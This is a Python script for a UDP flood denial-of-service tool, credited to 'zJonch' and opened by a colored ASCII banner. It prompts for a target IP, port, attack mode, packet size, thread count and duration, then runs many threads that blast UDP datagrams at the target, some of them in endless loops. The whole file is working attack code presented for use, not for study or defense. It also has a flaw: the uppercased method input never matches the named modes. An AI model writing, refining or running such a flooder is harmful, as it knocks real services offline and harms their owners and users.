import socket
import threading
import random
import time
import signal
import sys
import os
from os import system, name
from colorama import Fore, Style, init

init(autoreset=True)

def display_banner():
    banner = f"""
    {Fore.RED}███████╗███████╗ {Fore.GREEN}██████╗ {Fore.YELLOW}████████╗    {Fore.CYAN}███████╗{Fore.MAGENTA}██████╗  {Fore.RED}██████╗ {Fore.GREEN}████████╗
    {Fore.RED}██╔════╝██╔════╝{Fore.GREEN}██╔═══██╗{Fore.YELLOW}╚══██╔══╝    {Fore.CYAN}██╔════╝{Fore.MAGENTA}██╔══██╗{Fore.RED}██╔═══██╗{Fore.GREEN}╚══██╔══╝
    {Fore.RED}███████╗█████╗  {Fore.GREEN}██║   ██║   {Fore.YELLOW}██║       {Fore.CYAN}█████╗  {Fore.MAGENTA}██████╔╝{Fore.RED}██║   ██║   {Fore.GREEN}██║   
    {Fore.RED}╚════██║██╔══╝  {Fore.GREEN}██║   ██║   {Fore.YELLOW}██║       {Fore.CYAN}██╔══╝  {Fore.MAGENTA}██╔══██╗{Fore.RED}██║   ██║   {Fore.GREEN}██║   
    {Fore.RED}███████║███████╗{Fore.GREEN}╚██████╔╝   {Fore.YELLOW}██║       {Fore.CYAN}███████╗{Fore.MAGENTA}██║  ██║{Fore.RED}╚██████╔╝   {Fore.GREEN}██║   
    {Fore.RED}╚══════╝╚══════╝ {Fore.GREEN}╚═════╝    {Fore.YELLOW}╚═╝       {Fore.CYAN}╚══════╝{Fore.MAGENTA}╚═╝  ╚═╝ {Fore.RED}╚═════╝    {Fore.GREEN}╚═╝   
                                                                            
    {Fore.CYAN}Author: {Fore.MAGENTA}zJonch
    {Fore.CYAN}YouTube: {Fore.MAGENTA}@zJonch, @zJonch0
    """
    print(banner)

def udp_flood(target_ip, target_port, packet_size, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    
    while time.time() <= timeout:
        sock.sendto(bytes, (target_ip, target_port))

def send_packet(target_ip, target_port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(target_ip), int(target_port)))
        while True:
            s.send(b"\x99" * amplifier)
    except:
        return
    s.close()

def attack_HQ(target_ip, target_port, method, loops):
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet, args=(target_ip, target_port, 375), daemon=True).start()
    elif method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet, args=(target_ip, target_port, 750), daemon=True).start()
    elif method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet, args=(target_ip, target_port, 375), daemon=True).start()
            threading.Thread(target=send_packet, args=(target_ip, target_port, 750), daemon=True).start()

def start_attack(target_ip, target_port, method, packet_size, duration, threads):
    if method in ["UDP-Flood", "UDP-Power", "UDP-Mix"]:
        attack_HQ(target_ip, target_port, method, threads)
    else:
        for _ in range(threads):
            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, duration))
            thread.start()

def exit_gracefully(signum, frame):
    # Restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':
            clear()
            os.system("figlet Youre Leaving Sir -f slant")
            sys.exit(130)

    except KeyboardInterrupt:
        print("Ok ok")
        clear()
        os.system("figlet Youre Leaving Sir -f slant")
        sys.exit(130)

    # Restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

if __name__ == "__main__":
    display_banner()
    
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    method = input("Enter attack method (UDP-Flood/UDP-Power/UDP-Mix/UDP): ").upper()
    packet_size = int(input("Enter packet size in bytes: "))
    threads = int(input("Enter number of threads: "))
    duration = int(input("Enter duration of the attack in seconds (up to 300): "))
    
    if duration > 300:
        print("Duration exceeds the maximum limit of 300 seconds. Setting duration to 300 seconds.")
        duration = 300
    
    # Store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)

    start_attack(target_ip, target_port, method, packet_size, duration, threads)
